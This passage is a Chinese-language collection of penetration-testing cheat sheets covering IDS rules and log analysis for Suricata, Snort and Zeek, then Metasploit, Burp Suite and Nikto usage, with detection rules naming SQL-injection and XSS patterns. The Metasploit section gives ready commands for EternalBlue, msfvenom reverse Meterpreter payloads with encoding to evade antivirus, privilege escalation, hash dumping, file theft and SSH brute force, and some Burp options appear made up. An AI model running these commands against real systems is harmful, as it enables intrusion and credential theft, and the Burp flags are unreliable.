`alert tcp any any -> <目标IP> <端口> (msg:"<描述>"; sid:<ID>; rev:1;)`
```bash
# 检测到 22 端口的 SSH 流量告警
# alert tcp $HOME_NET any -> $EXTERNAL_NET 22 (msg:"SSH traffic"; sid:1000001; rev:1;)
```

**基本写法:检测恶意 User-Agent**
`alert http any any -> any any (msg:"Malicious UA"; http.user_agent; content:"<UA>"; sid:<ID>; rev:1;)`
```bash
# 检测包含恶意 User-Agent 的请求
# alert http any any -> any any (msg:"Suspicious UA"; http.user_agent; content:"sqlmap"; sid:1000002; rev:1;)
```

**基本写法:检测 SQL 注入特征**
`alert http any any -> any any (msg:"SQL Injection Attempt"; content:"UNION"; nocase; sid:<ID>; rev:1;)`
```bash
# 检测 SQL 注入 UNION 关键字
# alert http any any -> any any (msg:"SQLi attempt"; content:"UNION SELECT"; nocase; sid:1000003; rev:1;)
```

**基本写法:规则中引用正则**
`alert http any any -> any any (msg:"XSS Attempt"; pcre:"/<script/i"; sid:<ID>; rev:1;)`
```bash
# 使用正则检测 XSS 攻击
# alert http any any -> any any (msg:"XSS attempt"; pcre:"/<script[^>]*>/i"; sid:1000004; rev:1;)
```

---

## Suricata 日志分析

**基本写法:查看告警日志**
`tail -f /var/log/suricata/fast.log`
```bash
# 实时查看 Suricata 告警
sudo tail -f /var/log/suricata/fast.log
```

**基本写法:统计告警来源 IP**
`awk '{print $3}' /var/log/suricata/fast.log | sort | uniq -c | sort -rn`
```bash
# 统计告警来源 IP 排行
sudo awk '{print $3}' /var/log/suricata/fast.log | sort | uniq -c | sort -rn | head
```

**基本写法:检索特定规则告警**
`grep "<SID>" /var/log/suricata/fast.log`
```bash
# 查找特定规则 ID 的告警
grep "sid:1000001" /var/log/suricata/fast.log
```

**基本写法:分析 EVE JSON 日志**
`cat /var/log/suricata/eve.json | python3 -m json.tool | head -50`
```bash
# 格式化查看 EVE JSON 日志
cat /var/log/suricata/eve.json | python3 -m json.tool | head -50
```

**基本写法:提取告警事件**
`jq 'select(.event_type=="alert")' /var/log/suricata/eve.json`
```bash
# 使用 jq 提取所有告警事件
jq 'select(.event_type=="alert")' /var/log/suricata/eve.json
```

---

## Snort 基础操作

**基本写法:启动 Snort 监听**
`snort -i <接口> -c <配置文件>`
```bash
# 启动 Snort 监听 eth0
sudo snort -i eth0 -c /etc/snort/snort.conf
```

**基本写法:守护进程模式**
`snort -D -i <接口> -c <配置文件>`
```bash
# 后台运行 Snort
sudo snort -D -i eth0 -c /etc/snort/snort.conf -l /var/log/snort
```

**基本写法:测试配置**
`snort -T -c <配置文件>`
```bash
# 测试 Snort 配置文件
snort -T -c /etc/snort/snort.conf
```

**基本写法:读取 PCAP 文件**
`snort -r <PCAP文件> -c <配置文件>`
```bash
# 离线分析 PCAP 文件
snort -r capture.pcap -c /etc/snort/snort.conf -l /var/log/snort
```

**基本写法:查看 Snort 版本**
`snort -V`
```bash
# 查看 Snort 版本
snort -V
```

---

## Snort 规则编写

**基本写法:基础告警规则**
`alert tcp any any -> <目标> <端口> (msg:"<描述>"; sid:<ID>;)`
```bash
# 检测 ICMP 流量
# alert icmp any any -> any any (msg:"ICMP traffic"; sid:100001; rev:1;)
```

**基本写法:基于内容检测**
`alert tcp any any -> any 80 (msg:"<描述>"; content:"<关键字>"; nocase; sid:<ID>;)`
```bash
# 检测 HTTP 请求中的特定内容
# alert tcp any any -> any 80 (msg:"Directory traversal"; content:"../"; nocase; sid:100002; rev:1;)
```

**基本写法:基于正则匹配**
`alert tcp any any -> any 80 (msg:"<描述>"; pcre:"/<正则>/i"; sid:<ID>;)`
```bash
# 使用正则匹配 Web 攻击
# alert tcp any any -> any 80 (msg:"XSS attack"; pcre:"/<script.*alert/i"; sid:100003; rev:1;)
```

**基本写法:基于阈值限制告警**
`alert tcp any any -> any 80 (msg:"<描述>"; threshold:type threshold, track by_src, count 5, seconds 60; sid:<ID>;)`
```bash
# 60 秒内同一源 IP 最多告警 5 次
# alert tcp any any -> any 80 (msg:"HTTP scan"; threshold:type threshold, track by_src, count 5, seconds 60; sid:100004; rev:1;)
```

---

## Snort 日志分析

**基本写法:查看告警日志**
`tail -f /var/log/snort/alert`
```bash
# 实时查看 Snort 告警
sudo tail -f /var/log/snort/alert
```

**基本写法:统计告警次数**
`grep -c "alert" /var/log/snort/alert`
```bash
# 统计告警总数
grep -c "\[**\]" /var/log/snort/alert
```

**基本写法:提取告警类型**
`grep -oE "\[1:[0-9]+:[0-9]+\]" /var/log/snort/alert | sort | uniq -c | sort -rn`
```bash
# 提取告警规则 ID 并统计
grep -oE "\[1:[0-9]+:[0-9]+\]" /var/log/snort/alert | sort | uniq -c | sort -rn | head
```

**基本写法:检索特定规则告警**
`grep "<SID>" /var/log/snort/alert`
```bash
# 查找规则 ID 为 100001 的告警
grep "1:100001" /var/log/snort/alert
```

---

## Zeek(原 Bro)分析

**基本写法:启动 Zeek 监听**
`zeekctl deploy`
```bash
# 部署 Zeek 配置并启动
sudo zeekctl deploy
```

**基本写法:查看 Zeek 状态**
`zeekctl status`
```bash
# 查看 Zeek 各节点状态
sudo zeekctl status
```

**基本写法:分析 PCAP 文件**
`zeek -r <PCAP文件>`
```bash
# 离线分析 PCAP 生成 Zeek 日志
zeek -r capture.pcap
```

**基本写法:查看连接日志**
`cat conn.log | zeek-cut id.orig_h id.resp_h id.resp_p`
```bash
# 提取连接日志中的源 IP 目标 IP 端口
cat conn.log | zeek-cut id.orig_h id.resp_h id.resp_p | head
```

**基本写法:统计 HTTP 访问**
`cat http.log | zeek-cut host uri | sort | uniq -c | sort -rn`
```bash
# 统计 HTTP 访问的目标主机和 URI
cat http.log | zeek-cut host uri | sort | uniq -c | sort -rn | head
```

---

## IDS 规则管理

**基本写法:加载自定义规则**
`echo 'include /etc/suricata/rules/local.rules' >> <配置文件>`
```bash
# 在 Suricata 配置中加载自定义规则
echo 'include /etc/suricata/rules/local.rules' | sudo tee -a /etc/suricata/suricata.yaml
```

**基本写法:统计规则数量**
`grep -c "^alert\|^drop" <规则文件>`
```bash
# 统计规则文件中规则数量
grep -c "^alert\|^drop" /etc/suricata/rules/local.rules
```

**基本写法:禁用特定规则**
`sed -i 's/^alert.*sid:<SID>.*/#&/' <规则文件>`
```bash
# 注释掉指定 SID 的规则
sudo sed -i 's/^alert.*sid:1000001.*/#&/' /etc/suricata/rules/local.rules
```

**基本写法:Snort 加载自定义规则**
`echo 'include $RULE_PATH/local.rules' >> /etc/snort/snort.conf`
```bash
# 在 Snort 配置中加载自定义规则
echo 'include $RULE_PATH/local.rules' | sudo tee -a /etc/snort/snort.conf
```

---

## IDS 性能调优

**基本写法:查看 Suricata 运行统计**
`suricatasc -c uptime`
```bash
# 通过 Suricata 控制接口查看运行时间
suricatasc -c uptime
```

**基本写法:查看抓包统计**
`cat /var/log/suricata/stats.log | grep -i "drop"`
```bash
# 查看数据包丢弃情况
cat /var/log/suricata/stats.log | grep -i "drop\|drop_alert"
```

**基本写法:优化抓包模式**
`suricata --set af-packet.0.cluster-type=cluster_flow`
```bash
# 设置 AF_PACKET 集群模式为按流分发
sudo suricata --set af-packet.0.cluster-type=cluster_flow -c /etc/suricata/suricata.yaml -i eth0
```

**基本写法:调整运行模式**
`suricata --runmode=workers -c <配置文件> -i <接口>`
```bash
# 使用 workers 模式提高性能
sudo suricata --runmode=workers -c /etc/suricata/suricata.yaml -i eth0
```

**基本写法:查看 CPU 使用**
`top -p $(pidof suricata)`
```bash
# 监控 Suricata 进程 CPU 占用
top -p $(pgrep -d, suricata)
```

---

## IDS 部署验证

**基本写法:发送测试流量**
`curl -A "sqlmap/1.0" http://<目标>/test?id=1`
```bash
# 发送模拟攻击流量验证 IDS 检测
curl -A "sqlmap/1.0" "http://192.168.1.10/test?id=1' UNION SELECT 1--"
```

**基本写法:发送 ICMP 测试**
`ping -c 1 <目标>`
```bash
# 发送 ICMP 包触发 ICMP 规则
ping -c 1 192.168.1.10
```

**基本写法:使用 nmap 触发规则**
`nmap -sS -p 1-1000 <目标>`
```bash
# 端口扫描触发扫描检测规则
nmap -sS -p 1-1000 192.168.1.10
```

**基本写法:验证告警是否生成**
`tail -f /var/log/suricata/fast.log | grep "test"`
```bash
# 实时查看测试流量触发的告警
sudo tail -f /var/log/suricata/fast.log | grep -i "test\|sqlmap"
```



<!-- ============ 文档分隔线：033-cybersecurity/052-MetasploitCommands.md ============ -->


## msfconsole 基础操作

**基本写法:启动 msfconsole**
`msfconsole`
```bash
# 启动 Metasploit 控制台
msfconsole -q
```

**基本写法:查看版本**
`version`
```bash
# 查看 Metasploit 版本
msfconsole -q -x "version"
```

**基本写法:查看模块统计**
`show <模块类型>`
```bash
# 查看各类型模块数量
show all
```

**基本写法:查看帮助**
`help <命令>`
```bash
# 查看指定命令帮助
help search
```

**基本写法:退出控制台**
`exit`
```bash
# 退出 msfconsole
exit
```

---

## 模块搜索与加载

**基本写法:搜索漏洞利用模块**
`search <关键字>`
```bash
# 搜索 SMB 相关利用模块
search name:smb type:exploit
```

**基本写法:按 CVE 搜索**
`search <CVE编号>`
```bash
# 按 CVE 编号搜索模块
search CVE-2021-44228
```

**基本写法:按平台搜索**
`search platform:<平台>`
```bash
# 搜索 Linux 平台模块
search platform:linux type:exploit
```

**基本写法:加载模块**
`use <模块路径>`
```bash
# 加载指定利用模块
use exploit/windows/smb/ms17_010_eternalblue
```

**基本写法:查看模块信息**
`info <模块路径>`
```bash
# 查看模块详细信息
info exploit/multi/handler
```

**基本写法:查看模块选项**
`show options`
```bash
# 查看当前模块的配置选项
show options
```

---

## 模块配置与执行

**基本写法:设置目标地址**
`set RHOSTS <目标IP>`
```bash
# 设置目标主机地址
set RHOSTS 192.168.1.10
```

**基本写法:设置本地监听地址**
`set LHOST <本机IP>`
```bash
# 设置反向连接监听地址
set LHOST 192.168.1.5
```

**基本写法:设置监听端口**
`set LPORT <端口>`
```bash
# 设置监听端口
set LPORT 4444
```

**基本写法:设置 Payload**
`set PAYLOAD <payload路径>`
```bash
# 设置反向 Meterpreter Payload
set PAYLOAD windows/meterpreter/reverse_tcp
```

**基本写法:执行模块**
`exploit`
```bash
# 执行当前加载的模块
exploit -j
```

**基本写法:设置目标编号**
`set TARGET <编号>`
```bash
# 设置目标系统类型编号
set TARGET 0
```

---

## Meterpreter 操作

**基本写法:查看系统信息**
`sysinfo`
```bash
# 查看目标系统信息
sysinfo
```

**基本写法:获取当前用户**
`getuid`
```bash
# 查看当前权限用户
getuid
```

**基本写法:提权**
`getsystem`
```bash
# 尝试提权到 SYSTEM
getsystem
```

**基本写法:执行系统命令**
`execute -f <命令> -i`
```bash
# 在目标执行命令
execute -f cmd.exe -i -H
```

**基本写法:下载文件**
`download <远程文件> <本地路径>`
```bash
# 从目标下载文件
download C:\\Users\\admin\\secret.txt /tmp/
```

**基本写法:上传文件**
`upload <本地文件> <远程路径>`
```bash
# 上传文件到目标
upload /tmp/payload.exe C:\\Users\\Public\\
```

**基本写法:截屏**
`screenshot`
```bash
# 截取目标屏幕
screenshot -p /tmp/screen.png
```

---

## 后渗透操作

**基本写法:获取密码哈希**
`hashdump`
```bash
# 导出系统密码哈希
hashdump
```

**基本写法:获取进程列表**
`ps`
```bash
# 列出目标进程
ps
```

**基本写法:迁移进程**
`migrate <PID>`
```bash
# 迁移到指定进程
migrate 1234
```

**基本写法:查看网络连接**
`netstat`
```bash
# 查看目标网络连接状态
netstat
```

**基本写法:路由添加**
`route add <子网> <掩码> <会话ID>`
```bash
# 通过 Meterpreter 会话添加路由
route add 192.168.2.0 255.255.255.0 1
```

**基本写法:建立 socks 代理**
`use auxiliary/server/socks4a`
```bash
# 加载 socks 代理模块用于内网穿透
use auxiliary/server/socks4a
set SRVHOST 127.0.0.1
set SRVPORT 1080
run -j
```

---

## 辅助模块使用

**基本写法:端口扫描**
`use auxiliary/scanner/portscan/tcp`
```bash
# 使用 TCP 端口扫描模块
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.10
set PORTS 1-1000
run
```

**基本写法:SMB 版本探测**
`use auxiliary/scanner/smb/smb_version`
```bash
# 探测 SMB 版本信息
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.10
run
```

**基本写法:SSH 登录爆破**
`use auxiliary/scanner/ssh/ssh_login`
```bash
# SSH 密码爆破模块
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.10
set USERNAME root
set PASS_FILE passwords.txt
run
```

**基本写法:HTTP 目录扫描**
`use auxiliary/scanner/http/dir_scanner`
```bash
# 扫描 Web 目录
use auxiliary/scanner/http/dir_scanner
set RHOSTS 192.168.1.10
set DICTIONARY /usr/share/wordlists/dirb/common.txt
run
```

**基本写法:数据库凭据收集**
`use auxiliary/scanner/mssql/mssql_login`
```bash
# MSSQL 登录测试模块
use auxiliary/scanner/mssql/mssql_login
set RHOSTS 192.168.1.10
set USERNAME sa
set PASSWORD admin123
run
```

---

## Payload 生成

**基本写法:生成反向 Payload**
`msfvenom -p <payload> LHOST=<IP> LPORT=<端口> -f <格式> -o <文件>`
```bash
# 生成 Windows 反向 Meterpreter Payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe -o payload.exe
```

**基本写法:生成 Linux Payload**
`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<端口> -f elf -o <文件>`
```bash
# 生成 Linux ELF 格式 Payload
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f elf -o payload.elf
```

**基本写法:生成 Python Payload**
`msfvenom -p python/meterpreter/reverse_tcp LHOST=<IP> LPORT=<端口> -f raw -o <文件>`
```bash
# 生成 Python 格式 Payload
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f raw -o payload.py
```

**基本写法:生成 Payload 时编码**
`msfvenom -p <payload> -e <编码器> -i <次数> LHOST=<IP> LPORT=<端口> -f <格式> -o <文件>`
```bash
# 使用 shikata_ga_nai 编码 5 次
msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 LHOST=192.168.1.5 LPORT=4444 -f exe -o payload.exe
```

**基本写法:生成 PHP Payload**
`msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP> LPORT=<端口> -f php -o <文件>`
```bash
# 生成 PHP 格式 Payload
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f php -o payload.php
```

---

## 数据库操作

**基本写法:连接 PostgreSQL**
`db_connect <用户>:<密码>@<主机>/<数据库>`
```bash
# 连接 Metasploit 数据库
db_connect msf:msf@127.0.0.1/msf
```

**基本写法:查看数据库状态**
`db_status`
```bash
# 查看数据库连接状态
db_status
```

**基本写法:导入 nmap 扫描结果**
`db_import <XML文件>`
```bash
# 导入 nmap XML 扫描结果
db_import nmap_scan.xml
```

**基本写法:查看主机列表**
`hosts`
```bash
# 查看数据库中保存的主机
hosts
```

**基本写法:查看服务列表**
`services`
```bash
# 查看发现的服务
services
```

**基本写法:查看凭据**
`creds`
```bash
# 查看收集到的凭据
creds
```

---

## 资源脚本与自动化

**基本写法:执行资源脚本**
`resource <脚本文件>`
```bash
# 批量执行命令脚本
resource /tmp/commands.rc
```

**基本写法:创建资源脚本**
`echo "use auxiliary/scanner/portscan/tcp" > <脚本>`
```bash
# 创建自动化扫描脚本
cat > /tmp/scan.rc << 'EOF'
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set PORTS 22,80,443
run
EOF
```

**基本写法:启动时执行脚本**
`msfconsole -r <脚本文件>`
```bash
# 启动时执行指定脚本
msfconsole -r /tmp/scan.rc
```

**基本写法:执行单条命令**
`msfconsole -x "<命令>"`
```bash
# 启动后执行单条命令
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.5; set LPORT 4444; run"
```

---

## 报告与会话管理

**基本写法:查看活跃会话**
`sessions -l`
```bash
# 列出所有 Meterpreter 会话
sessions -l
```

**基本写法:进入指定会话**
`sessions -i <ID>`
```bash
# 进入指定 ID 的会话
sessions -i 1
```

**基本写法:后台当前会话**
`background`
```bash
# 将当前会话转入后台
background
```

**基本写法:杀死会话**
`sessions -k <ID>`
```bash
# 终止指定会话
sessions -k 1
```

**基本写法:生成报告**
`msfd`
```bash
# 启动 Metasploit 守护进程服务
msfd -a 127.0.0.1 -p 7337
```

---

## Metasploit 模块更新

**基本写法:更新 Metasploit**
`msfupdate`
```bash
# 更新 Metasploit 框架
msfupdate
```

**基本写法:查看已加载插件**
`show plugins`
```bash
# 查看可用插件列表
load wiki
```

**基本写法:加载插件**
`load <插件名>`
```bash
# 加载 nessus 插件
load nessus
```

**基本写法:查看数据库工作空间**
`workspace`
```bash
# 查看与切换工作空间
workspace
workspace -a pentest
```

**基本写法:查看模块缓存**
`show module_paths`
```bash
# 查看模块加载路径
show module_paths
```



<!-- ============ 文档分隔线：033-cybersecurity/053-BurpSuiteCLI.md ============ -->


## Burp Suite 启动配置

**基本写法:启动 Burp Suite GUI**
`java -jar burpsuite_pro.jar`
```bash
# 启动 Burp Suite 专业版
java -jar burpsuite_pro.jar
```

**基本写法:命令行模式启动**
`java -jar burpsuite_pro.jar --cmd`
```bash
# 命令行模式启动 Burp(用于自动化)
java -jar burpsuite_pro.jar --cmd
```

**基本写法:指定配置文件启动**
`java -jar burpsuite_pro.jar --config-file=<配置文件>`
```bash
# 使用指定配置文件启动
java -jar burpsuite_pro.jar --config-file=project.json
```

**基本写法:无界面启动(无 GUI)**
`java -jar burpsuite_pro.jar --cmd --project=<项目文件>`
```bash
# 无图形界面启动 Burp(适合服务器运行)
java -jar burpsuite_pro.jar --cmd --project=audit.burp
```

**基本写法:指定内存启动**
`java -Xmx<大小> -jar burpsuite_pro.jar`
```bash
# 分配 4GB 内存启动 Burp
java -Xmx4g -jar burpsuite_pro.jar
```

---

## Burp REST API 操作

**基本写法:启动 REST API 服务**
`java -jar burpsuite_pro.jar --api-key=<密钥>`
```bash
# 启动时指定 API 密钥
java -jar burpsuite_pro.jar --api-key=mysecretkey --project=audit.burp
```

**基本写法:获取 API 版本**
`curl -H "Authorization: <密钥>" http://127.0.0.1:1337/v0.1/version`
```bash
# 查询 Burp REST API 版本
curl -H "Authorization: mysecretkey" http://127.0.0.1:1337/v0.1/version
```

**基本写法:启动扫描任务**
`curl -X POST -H "Authorization: <密钥>" -H "Content-Type: application/json" http://127.0.0.1:1337/v0.1/scan -d '<JSON>'`
```bash
# 通过 API 启动站点扫描
curl -X POST -H "Authorization: mysecretkey" -H "Content-Type: application/json" http://127.0.0.1:1337/v0.1/scan -d '{"urls":["https://example.com"]}'
```

**基本写法:查看扫描状态**
`curl -H "Authorization: <密钥>" http://127.0.0.1:1337/v0.1/scan/<任务ID>`
```bash
# 查询指定扫描任务状态
curl -H "Authorization: mysecretkey" http://127.0.0.1:1337/v0.1/scan/abc123
```

**基本写法:获取扫描结果**
`curl -H "Authorization: <密钥>" http://127.0.0.1:1337/v0.1/scan/<任务ID>/issues`
```bash
# 获取扫描发现的问题列表
curl -H "Authorization: mysecretkey" http://127.0.0.1:1337/v0.1/scan/abc123/issues
```

---

## Burp Suite 扫描配置

**基本写法:配置爬虫深度**
`--crawl-depth=<深度>`
```bash
# 设置爬虫最大深度为 5
java -jar burpsuite_pro.jar --cmd --crawl-depth=5
```

**基本写法:设置爬虫超时**
`--crawl-timeout=<秒数>`
```bash
# 爬虫 600 秒后超时
java -jar burpsuite_pro.jar --cmd --crawl-timeout=600
```

**基本写法:配置并发连接**
`--max-connections=<数量>`
```bash
# 设置最大并发连接数
java -jar burpsuite_pro.jar --cmd --max-connections=20
```

**基本写法:配置请求间隔**
`--request-delay=<毫秒>`
```bash
# 请求间隔 200 毫秒(防止触发限流)
java -jar burpsuite_pro.jar --cmd --request-delay=200
```

**基本写法:设置扫描超时**
`--scan-timeout=<秒数>`
```bash
# 扫描 3600 秒后自动停止
java -jar burpsuite_pro.jar --cmd --scan-timeout=3600
```

---

## Burp 代理与证书

**基本写法:指定代理端口**
`--proxy-port=<端口>`
```bash
# 设置代理监听端口
java -jar burpsuite_pro.jar --proxy-port=8080
```

**基本写法:导出 CA 证书**
`curl -x http://127.0.0.1:8080 -o <文件> http://burp/cert`
```bash
# 通过代理获取 Burp CA 证书
curl -x http://127.0.0.1:8080 -o burp-cert.cer http://burp/cert
```

**基本写法:导入证书到系统**
`keytool -import -trustcacerts -alias burp -file <证书> -keystore <keystore>`
```bash
# 将 Burp CA 证书导入 Java keystore
keytool -import -trustcacerts -alias burp -file burp-cert.cer -keystore $JAVA_HOME/lib/security/cacerts
```

**基本写法:设置上游代理**
`--upstream-proxy=<代理URL>`
```bash
# 配置 Burp 使用上游代理
java -jar burpsuite_pro.jar --upstream-proxy=http://upstream-proxy:8081
```

**基本写法:配置 SOCKS 代理**
`--socks-proxy=<主机:端口>`
```bash
# 配置 SOCKS5 代理(配合 SSH 隧道)
java -jar burpsuite_pro.jar --socks-proxy=127.0.0.1:1080
```

---

## Burp 扫描自动化

**基本写法:命令行扫描单个 URL**
`java -jar burpsuite_pro.jar --cmd --scan-target=<URL>`
```bash
# 扫描单个目标 URL
java -jar burpsuite_pro.jar --cmd --scan-target=https://example.com
```

**基本写法:批量扫描 URL**
`java -jar burpsuite_pro.jar --cmd --scan-targets-file=<文件>`
```bash
# 从文件读取 URL 列表批量扫描
java -jar burpsuite_pro.jar --cmd --scan-targets-file=urls.txt
```

**基本写法:导入爬虫结果**
`java -jar burpsuite_pro.jar --cmd --import-file=<文件>`
```bash
# 导入之前保存的爬虫结果
java -jar burpsuite_pro.jar --cmd --import-file=crawl.xml
```

**基本写法:导出扫描报告**
`java -jar burpsuite_pro.jar --cmd --export-report=<文件>`
```bash
# 导出扫描报告为 HTML
java -jar burpsuite_pro.jar --cmd --export-report=report.html
```

**基本写法:指定报告格式**
`--report-format=<格式>`
```bash
# 导出 XML 格式报告
java -jar burpsuite_pro.jar --cmd --export-report=report.xml --report-format=xml
```

---

## Burp 扩展加载

**基本写法:加载扩展**
`--extension=<扩展文件>`
```bash
# 启动时加载扩展
java -jar burpsuite_pro.jar --extension=/path/to/extension.jar
```

**基本写法:从 BApp Store 加载**
`--bapp=<扩展名>`
```bash
# 加载 BApp Store 中的扩展
java -jar burpsuite_pro.jar --bapp=LoggerPlusPlus
```

**基本写法:列出已安装扩展**
`--list-extensions`
```bash
# 列出所有已安装的扩展
java -jar burpsuite_pro.jar --list-extensions
```

**基本写法:卸载扩展**
`--remove-extension=<扩展名>`
```bash
# 卸载指定扩展
java -jar burpsuite_pro.jar --remove-extension=LoggerPlusPlus
```

**基本写法:更新所有扩展**
`--update-extensions`
```bash
# 更新 BApp Store 中所有已安装扩展
java -jar burpsuite_pro.jar --update-extensions
```

---

## Burp Intruder 自动化

**基本写法:启动 Intruder 任务**
`curl -X POST -H "Authorization: <密钥>" http://127.0.0.1:1337/v0.1/intruder -d '<JSON>'`
```bash
# 通过 API 启动 Intruder 任务
curl -X POST -H "Authorization: mysecretkey" -H "Content-Type: application/json" http://127.0.0.1:1337/v0.1/intruder -d '{"target":"https://example.com/login"}'
```

**基本写法:使用 burprepeater 命令行**
`curl -X POST -H "Authorization: <密钥>" http://127.0.0.1:1337/v0.1/repeater -d '<JSON>'`
```bash
# 通过 API 发送 Repeater 请求
curl -X POST -H "Authorization: mysecretkey" -H "Content-Type: application/json" http://127.0.0.1:1337/v0.1/repeater -d '{"request":"GET / HTTP/1.1\r\nHost: example.com\r\n\r\n"}'
```

**基本写法:加载 payload 文件**
`--payload-file=<文件>`
```bash
# 加载字典文件用于 Intruder
java -jar burpsuite_pro.jar --payload-file=passwords.txt
```

**基本写法:设置 payload 编码**
`--payload-encoding=<编码>`
```bash
# 设置 payload URL 编码
java -jar burpsuite_pro.jar --payload-encoding=url
```

---

## Burp 日志与分析

**基本写法:启用请求日志**
`--log-file=<文件>`
```bash
# 启动时记录所有请求到日志
java -jar burpsuite_pro.jar --log-file=traffic.log
```

**基本写法:启用详细日志**
`--verbose`
```bash
# 输出详细日志信息
java -jar burpsuite_pro.jar --cmd --verbose
```

**基本写法:统计请求数量**
`grep -c "Request:" <日志文件>`
```bash
# 统计日志中请求数量
grep -c "GET\|POST" traffic.log
```

**基本写法:提取异常响应**
`grep "500 Internal\|403 Forbidden" <日志文件>`
```bash
# 提取服务器错误响应
grep -E "500 Internal|403 Forbidden|401 Unauthorized" traffic.log
```

**基本写法:监控实时请求**
`tail -f <日志文件> | grep -E "POST|PUT|DELETE"`
```bash
# 实时监控危险方法请求
tail -f traffic.log | grep -E "POST|PUT|DELETE"
```

---

## Burp 项目管理

**基本写法:创建临时项目**
`--project=temporary`
```bash
# 创建临时项目(关闭后丢弃)
java -jar burpsuite_pro.jar --project=temporary
```

**基本写法:打开指定项目**
`--project=<项目文件>`
```bash
# 打开已存在的项目文件
java -jar burpsuite_pro.jar --project=audit.burp
```

**基本写法:保存项目**
`--save-project=<文件>`
```bash
# 命令行退出时保存项目
java -jar burpsuite_pro.jar --cmd --save-project=audit.burp
```

**基本写法:导出配置**
`--export-config=<文件>`
```bash
# 导出当前配置到文件
java -jar burpsuite_pro.jar --export-config=settings.json
```

**基本写法:导入配置**
`--import-config=<文件>`
```bash
# 从配置文件导入设置
java -jar burpsuite_pro.jar --import-config=settings.json
```

---

## Burp 认证配置

**基本写法:设置代理认证**
`--proxy-auth=<用户>:<密码>`
```bash
# 配置代理需要认证
java -jar burpsuite_pro.jar --proxy-auth=user:pass
```

**基本写法:设置平台认证**
`--platform-authentication`
```bash
# 启用平台认证集成
java -jar burpsuite_pro.jar --platform-authentication
```

**基本写法:加载 Cookie 文件**
`--cookie-jar=<文件>`
```bash
# 从文件加载 Cookie 用于扫描
java -jar burpsuite_pro.jar --cookie-jar=cookies.txt
```

**基本写法:设置 HTTP 头**
`--header="<头>:<值>"`
```bash
# 添加自定义请求头
java -jar burpsuite_pro.jar --header="Authorization: Bearer token123"
```

**基本写法:忽略 SSL 证书错误**
`--ignore-ssl-errors`
```bash
# 忽略 SSL 证书校验错误
java -jar burpsuite_pro.jar --ignore-ssl-errors
```



<!-- ============ 文档分隔线：033-cybersecurity/054-NiktoScan.md ============ -->


## Nikto 基础扫描

**基本写法:基础扫描目标**
`nikto -h <主机>`
```bash
# 对目标主机执行基础扫描
nikto -h https://example.com
```

**基本写法:指定端口扫描**
`nikto -h <主机> -p <端口>`
```bash
# 扫描指定端口的 Web 服务
nikto -h example.com -p 8080
```

**基本写法:扫描多个端口**
`nikto -h <主机> -p <端口1>-<端口2>`
```bash
# 扫描 80-443 端口范围
nikto -h example.com -p 80-443
```

**基本写法:使用 SSL 扫描**
`nikto -h <主机> -ssl`
```bash
# 强制使用 SSL 扫描
nikto -h example.com -ssl -p 443
```

**基本写法:指定输出文件**
`nikto -h <主机> -o <文件>`
```bash
# 扫描结果输出到文件
nikto -h example.com -o scan_result.html -Format htm
```

---

## Nikto 调优与配置

**基本写法:设置扫描调优**
`nikto -h <主机> -Tuning <选项>`
```bash
# 调优选项 1-9(1=有趣文件 2=错误配置 3=信息泄露 4=XSS 8=命令执行 9=SQL 注入)
nikto -h example.com -Tuning 9
```

**基本写法:多项调优组合**
`nikto -h <主机> -Tuning <选项组合>`
```bash
# 同时检测 SQL 注入与 XSS
nikto -h example.com -Tuning 49
```

**基本写法:排除特定测试**
`nikto -h <主机> -SkipHandler <选项>`
```bash
# 跳过特定测试项加快扫描
nikto -h example.com -SkipHandler 2
```

**基本写法:禁用交互式功能**
`nikto -h <主机> -ask no`
```bash
# 禁止交互式确认(适合自动化脚本)
nikto -h example.com -ask no
```

**基本写法:设置超时**
`nikto -h <主机> -timeout <秒数>`
```bash
# 设置请求超时为 10 秒
nikto -h example.com -timeout 10
```

---

## Nikto 认证与代理

**基本写法:使用 Basic 认证**
`nikto -h <主机> -id <用户:密码>`
```bash
# 使用 HTTP Basic 认证扫描受保护区域
nikto -h example.com -id admin:password
```

**基本写法:使用 Cookie 认证**
`nikto -h <主机> -vhost <域名>`
```bash
# 使用虚拟主机头扫描
nikto -h 192.168.1.10 -vhost example.com
```

**基本写法:通过代理扫描**
`nikto -h <主机> -useproxy <代理URL>`
```bash
# 通过 HTTP 代理进行扫描
nikto -h example.com -useproxy http://127.0.0.1:8080
```

**基本写法:配置代理认证**
`nikto -h <主机> -useproxy <代理URL> -id <用户:密码>`
```bash
# 代理需要认证时
nikto -h example.com -useproxy http://127.0.0.1:8080 -id user:pass
```

**基本写法:使用客户端证书**
`nikto -h <主机> -cert <证书> -key <私钥>`
```bash
# 使用客户端证书扫描
nikto -h example.com -cert client.pem -key key.pem
```

---

## Nikto 扫描选项

**基本写法:禁用 SSL 证书校验**
`nikto -h <主机> -nossl`
```bash
# 禁用 SSL 证书验证
nikto -h example.com -ssl -nossl
```

**基本写法:指定 User-Agent**
`nikto -h <主机> -useragent <UA>`
```bash
# 自定义 User-Agent
nikto -h example.com -useragent "Mozilla/5.0 Custom Scanner"
```

**基本写法:自定义请求头**
`nikto -h <主机> -vhost <域名>`
```bash
# 添加 Host 头扫描虚拟主机
nikto -h 192.168.1.10 -p 80 -vhost app.example.com
```

**基本写法:禁用 404 检测**
`nikto -h <主机> -404code`
```bash
# 禁用 404 错误码检测(避免误报)
nikto -h example.com -404code
```

**基本写法:显示详细输出**
`nikto -h <主机> -Display V`
```bash
# 显示详细输出信息
nikto -h example.com -Display V
```

---

## Nikto 批量扫描

**基本写法:从文件读取目标**
`nikto -h <主机文件>`
```bash
# 批量扫描文件中的主机
nikto -h hosts.txt
```

**基本写法:多端口批量扫描**
`nikto -h <主机> -p <端口列表>`
```bash
# 扫描多个指定端口
